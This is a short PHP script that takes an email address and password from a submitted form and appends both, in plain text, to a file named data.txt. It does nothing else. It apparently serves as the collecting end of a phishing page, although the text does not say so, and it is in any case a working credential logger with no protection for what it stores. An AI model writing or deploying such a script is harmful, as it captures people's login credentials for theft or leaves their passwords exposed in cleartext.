<?php
$email = trim($_POST['email']); 
$password = trim( $_POST['password']);

$fp = fopen('data.txt','a');
fwrite($fp,"email:{$email}\n");
fwrite($fp,"password:{$password}\n");